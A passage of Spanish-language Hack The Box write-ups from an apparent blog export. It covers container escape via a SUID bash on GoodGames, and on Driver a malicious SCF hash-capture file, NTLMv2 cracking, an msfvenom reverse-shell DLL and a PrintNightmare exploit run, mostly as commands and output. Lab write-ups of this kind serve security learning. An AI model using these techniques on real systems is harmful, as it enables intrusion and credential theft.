flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        loop  txqueuelen 1000  (Local Loopback)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0No estamos en la máquina víctima, estamos en un contenedor.Vamos a buscar la flag de usuario:root@3a453ab39d3d:/home/augustus# cat user.txtcat user.txtfac66129ab2b4bc1bd67d5410¡Bien! Tenemos la flag, ahora tenemos que salir del contenedor.Escalada de privilegiosSi vemos el passwd:root@3a453ab39d3d:/home/augustus# cat /etc/passwdcat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/falseNo existe el usuario augustus.root@3a453ab39d3d:/home# ls -lals -latotal 12drwxr-xr-x 1 root root 4096 Nov  5  2021 .drwxr-xr-x 1 root root 4096 Nov  5  2021 ..drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 augustusNi tampoco el grupo 1000, asi que esto nos hace pensar que quizás es una montura desde el equipo real desplegado en un contenedor, si buscamos:root@3a453ab39d3d:/home# mount | grep augustusmount | grep augustus/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)Efectivamente, corresponde a una montura de /home/augustus desde la máquina víctima.Vamos a enumerar los puertos abiertos de la máquina desde dentro, vamos a tener que hacerlo manual, para ello enviaremos una cadena vacía al /dev/tpc/ipmaquinavictima, si el resultado es exitoso sabemos que está abierto sino estará cerrado:root@3a453ab39d3d:/backend# for port in $(seq 1 1000);do (echo '' &gt; /dev/tcp/172.19.0.1/$port) 2&gt;/dev/null &amp;&amp; echo \"puerto $port abierto\";doneEn este caso utilizamos la 172.19.0.1 pues será la máquina víctima real, y mediante el operador and vemos si el puerto está abierto o no, esto lo hacemos para los primeros 1000.El resultado es:root@3a453ab39d3d:/backend# for port in $(seq 1 1000);do (echo '' &gt; /dev/tcp/172.19.0.1/$port) 2&gt;/dev/null&amp;&amp; echo \"puerto $port abierto\";done&lt;ort) 2&gt;/dev/null&amp;&amp; echo \"puerto $port abierto\";donepuerto 22 abiertopuerto 80 abiertoVemos que la máquina tiene el puerto 22 abierto, esto no lo podíamos ver desde fuera, vamos a intentar conectarnos por ssh utilizando la credencial que encontramos:ssh augustus@172.19.0.1The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.Are you sure you want to continue connecting (yes/no)? yesyesWarning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.augustus@172.19.0.1's password: superadministratorLinux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.augustus@GoodGames:~$ ifconfigifconfig-bash: ifconfig: command not foundaugustus@GoodGames:~$ ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:50:56:b9:f5:13 brd ff:ff:ff:ff:ff:ff    inet 10.10.11.130/24 brd 10.10.11.255 scope global eth0       valid_lft forever preferred_lft forever    inet6 dead:beef::250:56ff:feb9:f513/64 scope global dynamic mngtmpaddr        valid_lft 86395sec preferred_lft 14395sec    inet6 fe80::250:56ff:feb9:f513/64 scope link        valid_lft forever preferred_lft forever3: br-99993f3f3b6b: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default     link/ether 02:42:53:4f:28:c4 brd ff:ff:ff:ff:ff:ff    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-99993f3f3b6b       valid_lft forever preferred_lft forever    inet6 fe80::42:53ff:fe4f:28c4/64 scope link        valid_lft forever preferred_lft forever4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default     link/ether 02:42:7c:16:fe:f1 brd ff:ff:ff:ff:ff:ff    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0       valid_lft forever preferred_lft forever6: veth4724af8@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-99993f3f3b6b state UP group default     link/ether d2:b4:1d:48:a9:54 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet6 fe80::d0b4:1dff:fe48:a954/64 scope link        valid_lft forever preferred_lft foreverBien, ha funcionado ahora estamos dentro de la máquina víctima.Ahora, hay que pensar lo siguiente, tenemos una montura del directorio /home/augustus en el docker, y dentro del docker somos root, lo que podríamos hacer es lo siguiente:augustus@GoodGames:~$ cp /bin/bash .cp /bin/bash .Copiamos la bash en el directorio /home/augustus y nos devolvemos al contenedor:drwxr-xr-x 2 1000 1000    4096 Feb 16 18:14 .drwxr-xr-x 1 root root    4096 Nov  5  2021 ..lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -&gt; /dev/null-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile-rwxr-xr-x 1 1000 1000 1234376 Feb 16 18:14 bash-rw-r----- 1 root 1000      33 Feb 16 13:07 user.txtObservamos que tenemos efectivamente la bash aquí pues es una montura, lo que haremos entonces será setearle como usuario root y hacerlo SUID:root@3a453ab39d3d:/home/augustus# chown root:root bashroot@3a453ab39d3d:/home/augustus# chmod 4755 /bin/bashchmod 4755 /bin/bashroot@3a453ab39d3d:/home/augustus# ls -lals -latotal 1232drwxr-xr-x 2 1000 1000    4096 Feb 16 18:14 .drwxr-xr-x 1 root root    4096 Nov  5  2021 ..lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -&gt; /dev/null-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile-rwsr-xr-x 1 root root 1234376 Feb 16 18:14 bash-rw-r----- 1 root 1000      33 Feb 16 13:07 user.txtVemos que ahora es el propietario es root y es SUID, volvemos a conectarnos por ssh a la máquina víctima:augustus@GoodGames:~$ ls -lals -latotal 1232drwxr-xr-x 2 augustus augustus    4096 Feb 16 18:14 .drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..-rwsr-xr-x 1 root     root     1234376 Feb 16 18:14 bashlrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -&gt; /dev/null-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile-rw-r----- 1 root     augustus      33 Feb 16 13:07 user.txtAquí la tenemos, entonces simplemente lo usamos:augustus@GoodGames:~$ ./bash -p./bash -pbash-5.1# whoamiwhoamirootNos hemos convertido en root.Ahora vamos a buscar la flag:bash-5.1# cd /root/cd /root/bash-5.1# cat root.txtcat root.txt5b27d5f28150913f91baba¡Listo! Hemos terminado la máquina.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Driver HTB Write-up",
    "url": "/posts/Driver/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Weak password, Printer, NTLMv2 cracking, CVE-2021-1675, PrintNigthmare, Exploit, WinPEAS, SCF, Linux, Easy",
    "date": "2023-02-16 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Driver, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Credenciales de...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Driver, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Credenciales demasiado débiles.  Utilización de archivo SCF malicioso.  Captura y crackeo de hash NTLMV2.  Explotación de PrintNigthmare (CVE-2021-1675).Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.11.106PING 10.10.11.106 (10.10.11.106) 56(84) bytes of data.64 bytes from 10.10.11.106: icmp_seq=1 ttl=127 time=142 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS --open -min-rate 5000 10.10.11.106 -oG PortAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT     STATE SERVICE80/tcp   open  http135/tcp  open  msrpc445/tcp  open  microsoft-ds5985/tcp open  wsman7680/tcp open  pando-pubRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p80,135,445,5985,7680 10.10.11.106 -oN ServiceScanComo resultado del escaneo tenemos:80/tcp   open     http         Microsoft IIS httpd 10.0|_http-title: Site doesn't have a title (text/html; charset=UTF-8).|_http-server-header: Microsoft-IIS/10.0| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_  Basic realm=MFP Firmware Update Center. Please enter password for admin| http-methods: |_  Potentially risky methods: TRACE135/tcp  open     msrpc        Microsoft Windows RPC445/tcp  open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)5985/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found7680/tcp filtered pando-pubService Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-time: |   date: 2023-02-17T02:39:47|_  start_date: 2023-02-17T02:36:06| smb2-security-mode: |   311: |_    Message signing enabled but not requiredVemos diferentes servicios, en primer lugar vemos el puerto 445 abierto, vamos a ver si podemos enumerar información:crackmapexec smb 10.10.11.106SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)Vamos a ver si podemos listar contenido:smbmap -H 10.10.11.106[!] Authentication error on 10.10.11.106Pero se necesitan credenciales válidas asi que no podemos hacer mucho por aqui.Vemos servicios web, vamos a utilizar whatweb para ver de qué se trata: whatweb 10.10.11.106http://10.10.11.106 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.106], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]Si entramos a la web, encontramos lo siguiente:Es un panel de autenticación, vamos a probar contraseñas comunes por default:Resultó ser admin admin.Si inspeccionamos la web la única parte que funciona es esta:Vemos que podemos subir un archivo.ExplotaciónSi realizamos fuzzing no encontramos nada interesante, ni tampoco alguna ruta que nos permita ver los archivos subidos, pero si prestamos atención dice que Our testing team will review the uploads manually and initiates the testing soon., por lo tanto, en caso de que alguien abra este archivo, podemos hacer un archivo SCF malicioso, lo que haremos será tener un recurso compartido por smb, en el momento que el usuario abra el archivo hará una petición a nuestro servidor por smb intentando encontrar algo, ese algo corresponde a un icono, en ese momento nosotros podremos tener su hash NTLMV2 que podemos intentar crackear.En la web de pentestlab encontramos esto:[Shell]Command=2IconFile=\\\\X.X.X.X\\share\\pentestlab.ico[Taskbar]Command=ToggleDesktopVamos a agregar nuestra dirección:[Shell]Command=2IconFile=\\\\10.10.14.17\\share\\pentestlab.ico[Taskbar]Command=ToggleDesktopVamos a crearnos nuestro servidor con impacket:impacket-smbserver shares $(pwd) -smb2supportImpacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsedVamos a subir el archivo SCF a la página:Si le damos a enviar y vemos nuestro servidor:impacket-smbserver shares $(pwd) -smb2supportImpacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (10.10.11.106,49414)[*] AUTHENTICATE_MESSAGE (DRIVER\\tony,DRIVER)[*] User DRIVER\\tony authenticated successfully[*] tony::DRIVER:aaaaaaaaaaaaaaaa:54c57ca37a0fd7e1acabb0d4db22f1ca:0101000000000000802c281b4342d901a31c7d008e3bb7580000000001001000540052004900460064004c0044007a0003001000540052004900460064004c0044007a00020010005400550047004e00650068004e005100040010005400550047004e00650068004e00510007000800802c281b4342d9010600040002000000080030003000000000000000000000000020000077d4186e48d17352d9804ca5dcc89946e03f576795cf67d411196b5f849b8e690a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003700000000000000000000000000[*] Connecting Share(1:IPC$)[-] SMB2_TREE_CONNECT not found share[-] SMB2_TREE_CONNECT not found share[*] Disconnecting Share(1:IPC$)[*] Closing down connection (10.10.11.106,49414)[*] Remaining connections []Tenemos nuestro hash, vamos a intentar crackearlo:john --wordlist=/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusliltony          (tony)     1g 0:00:00:00 DONE (2023-02-16 15:15) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s !!!!!!..eatme1Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completed. Obtuvimos la contraseña, vamos a validarlas con crackmapexec:crackmapexec smb 10.10.11.106 -u 'tony' -p 'liltony'SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)SMB         10.10.11.106    445    DRIVER           [+] DRIVER\\tony:liltonyObservamos que las credenciales son correctas, vamos a enumerar ahora la información del winrm:crackmapexec winrm 10.10.11.106 -u 'tony' -p 'liltony'SMB         10.10.11.106    5985   NONE             [*] None (name:10.10.11.106) (domain:None)HTTP        10.10.11.106    5985   NONE             [*] http://10.10.11.106:5985/wsmanWINRM       10.10.11.106    5985   NONE             [+] None\\tony:liltony (Pwn3d!)Vemos que corresponde al grupo remote management use, asi que vamos a ganar acceso por evil-winrm: evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'Evil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; ipconfigWindows IP ConfigurationEthernet adapter Ethernet0:   Connection-specific DNS Suffix  . : htb   IPv6 Address. . . . . . . . . . . : dead:beef::176   IPv6 Address. . . . . . . . . . . : dead:beef::f80b:afef:a6e1:f1e7   Temporary IPv6 Address. . . . . . : dead:beef::a1aa:542b:b5e:3e   Link-local IPv6 Address . . . . . : fe80::f80b:afef:a6e1:f1e7%5   IPv4 Address. . . . . . . . . . . : 10.10.11.106   Subnet Mask . . . . . . . . . . . : 255.255.254.0   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:4ee%5Vemos que estamos ya dentro de la máquina, vamos a buscar la flag de usuario:*Evil-WinRM* PS C:\\Users\\tony\\Desktop&gt; type user.txtc921262ea60eb13f42dbdccAhora tenemos que escalar privilegios.Escalada de privilegiosVamos a utilizar winPEAS.exe para recolectar información.Luego de realizar el escaneo con winPEAS.exe, no encontramos mucho, pero encontramos algo interesante:      PowerShell Settings    PowerShell v2 Version: 2.0    PowerShell v5 Version: 5.0.10240.17146    PowerShell Core Version:     Transcription Settings:     Module Logging Settings:     Scriptblock Logging Settings:     PS history file: C:\\Users\\tony\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt    PS history size: 134BEncontramos que tiene un historial, vamos a verlo:Add-Printer -PrinterName \"RICOH_PCL6\" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'                                                                                                                                                                                                                                                                                                                                ping 1.1.1.1                                                                                                                                                                                                       ping 1.1.1.1Vemos un nombre de impresora y un drivername, RICOH PCL6 UniversalDriver V4.23, vamos a buscarlo por google por si existen vulnerabilidades:Podemos ver que efectivamente existen vulnerabilidades, es la llamada PrintNightmare (CVE-2021-1675).Utilizaremos la versión con python, debido a que en la máquina no podemos ejecutar ningún archivo por motivos de seguridad, en el github encontraremos el .py que necesitamos para explotar la vulnerabilidad.El primer paso consiste en clonarse el repositorio.Luego, crearemos un payload .dll con msfvenom que realice una conexión reversa a nuestra máquina:msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=4444 -f dll &gt; shell-x64.dll/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 460 bytesFinal size of dll file: 8704 bytesLuego, debemos abrir un servidor smb, utilizaremos impacket:impacket-smbserver shares $(pwd) -smb2supportImpacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 FortraLuego, tenemos que dejar a nuestro netcat escuchando por el puerto elegido, en este caso el 4444.En este punto debemos ejectuar el script con lo siguiente:python3 CVE-2021-1675.py driver/tony:liltony@10.10.11.106 '\\\\10.10.14.17\\shares\\shell-x64.dll'Con esta información ejecutamos el código:python3 CVE-2021-1675.py driver/tony:liltony@10.10.11.106 '\\\\10.10.14.17\\shares\\shell-x64.dll'[*] Connecting to ncacn_np:10.10.11.106[\\PIPE\\spoolss][+] Bind OK[+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\UNIDRV.DLL[*] Executing \\??\\UNC\\10.10.14.17\\shares\\shell-x64.dll[*] Try 1...[*] Stage0: 0[*] Try 2...Si observamos nuestro servidor smb:mpacket-smbserver shares $(pwd) -smb2supportImpacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (10.10.11.106,49436)[*] AUTHENTICATE_MESSAGE (\\,DRIVER)[*] User DRIVER\\ authenticated successfully[*] :::00::aaaaaaaaaaaaaaaa[*] Connecting Share(1:IPC$)[*] Connecting Share(2:shares)[*] Disconnecting Share(1:IPC$)Y si vemos nuestro netcat:nc -nvlp 4444listening on [any] 4444 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.106] 49440Microsoft Windows [Version 10.0.10240](c) 2015 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\system¡Bien! Ahora somos administradores, vamos a buscar la flag:C:\\Users\\Administrator\\Desktop&gt;type root.txttype root.txtdecc81a8b46f8c9b252fffc¡Listo! Hemos terminado la máquina.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Bolt HTB Write-up",
    "url": "/posts/Bolt/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Information leakage, SSTI, SQLite3, MySQL, LinPEAS, GPG, Linux, Medium",
    "date": "2023-02-13 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Bolt, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del ...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Bolt, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema y subdominios.  Leaks de información sensible.  SSTI (Jinja2).  Enumeración de bases de datos (sqlite3, mysql).  Utilización de linpeas.sh para encontrar información.  Uso de GPG.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.11.114PING 10.10.11.114 (10.10.11.114) 56(84) bytes of data.64 bytes from 10.10.11.114: icmp_seq=1 ttl=63 time=143 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS --open -min-rate 5000 10.10.11.114 -oG PortAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http443/tcp open  httpsRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p22,80,443 10.10.11.114 -oN ServiceScanComo resultado del escaneo tenemos:PORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 4d208ab2c28cf53ebed2e81816286e8e (RSA)|   256 7b0ec75f5a4c7a117fdd585a172fcdea (ECDSA)|_  256 a7224e45198e7d3cbcdf6e1d6c4f4156 (ED25519)80/tcp  open  http     nginx 1.18.0 (Ubuntu)|_http-title:     Starter Website -  About |_http-server-header: nginx/1.18.0 (Ubuntu)443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)|_ssl-date: TLS randomness does not represent time|_http-server-header: nginx/1.18.0 (Ubuntu)| http-title: Passbolt | Open source password manager for teams|_Requested resource was /auth/login?redirect=%2F| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU| Not valid before: 2021-02-24T19:11:23|_Not valid after:  2022-02-24T19:11:23Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelObservamos http y https, utilizaremos whatweb para enumerar información:whatweb 10.10.11.114http://10.10.11.114 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@company.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.114], JQuery, Meta-Author[Themesberg], Open-Graph-Protocol[website], Script, Title[Starter Website -  About][Title element contains newline(s)!], nginx[1.18.0]whatweb https://10.10.11.114https://10.10.11.114 [302 Found] Cookies[passbolt_session], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[passbolt_session], IP[10.10.11.114], RedirectLocation[/auth/login?redirect=%2F], UncommonHeaders[content-security-policy], nginx[1.18.0]https://10.10.11.114/auth/login?redirect=%2F [200 OK] Cookies[csrfToken,passbolt_session], Country[RESERVED][ZZ], Django, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[passbolt_session], IP[10.10.11.114], Script, Strict-Transport-Security[max-age=31536000; includeSubDomains], Title[Passbolt | Open source password manager for teams], UncommonHeaders[x-permitted-cross-domain-policies,referrer-policy,x-download-options,x-content-type-options,x-gpgauth-version,x-gpgauth-login-url,x-gpgauth-logout-url,x-gpgauth-verify-url,x-gpgauth-pubkey-url,access-control-expose-headers,x-gpgauth-authenticated,x-gpgauth-progress,x-gpgauth-error,x-gpgauth-debug,content-security-policy], X-Frame-Options[sameorigin], nginx[1.18.0]Observamos un montón de información, en primer lugar, vamos a visitar la página por http:Si inspeccionamos la página, no encontramos nada interesante, pero tenemos un panel de login:Intentamos entrar por si tienen credenciales por defecto:Pero no. Adelantando por acá no pillamos ningún tipo de vulnerabilidad.Si volvemos a la página principal vemos diferentes opciones:Si las revisamos no encontramos nada interesante, sin embargo, existe la de descargas, que nos descarga un archivo .tar:Sin embargo, lo revisaremos después. Ahora vamos a inspeccionar la página https:Pero no vemos nada.Si observamos las capturas dentro del certificado ssl encontramos lo siguiente passbolt.bolt.htb, vamos a agregar estas direcciones a nuestro archivo /etc/hosts.127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.11.114    bolt.htb passbolt.bolt.htbSi ingresamos al subdominio:Pero al momento de ingresar un mail nos dice lo siguiente:No tenemos invitación, por lo tanto, poco que hacer acá. De la misma que lo anterior, si probamos injecciones acá tampoco encontraremos nada.En este punto vamos a enumerar subdominios, en caso de no encontrar nada 